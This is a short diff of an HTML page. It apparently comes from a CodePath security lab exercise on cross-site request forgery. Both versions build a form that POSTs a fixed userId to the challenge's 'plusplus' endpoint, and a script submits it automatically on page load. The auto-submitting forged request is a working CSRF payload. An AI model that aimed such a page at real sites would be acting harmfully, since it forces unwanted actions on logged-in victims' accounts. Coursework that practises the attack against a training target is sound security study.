@@ -1,16 +1,8 @@
-<HTML>
-<HEAD>
-<TITLE>Frank experiment</TITLE>
-</HEAD>
-<H1>Hi</H1>
-<H2>Holar</H2>
-<P> Arigato
-<P> <B>dede</B>
-<BR> <B><I>123123.</I></B>
-<form name="evilForm" action="https://security.codepath.com/csrfchallengetwo/plusplus" method="POST">
-    <input type="hidden" name="userId" value="798154698e3fcd48676409c44981f66acf405472" />
-    <input type="submit"/>
+<p>TEST</p>
+<form name="csrfForm" action="https://security.codepath.com/user/csrfchallengetwo/plusplus" method="POST">
+  <input type="text" name="userId" value="798154698e3fcd48676409c44981f66acf405472">
+  <input type="submit">
 </form>
-<script> document.evilForm.submit(); </script>
-</BODY>
-</HTML>
+<script>
+  document.csrfForm.submit();
+</script>
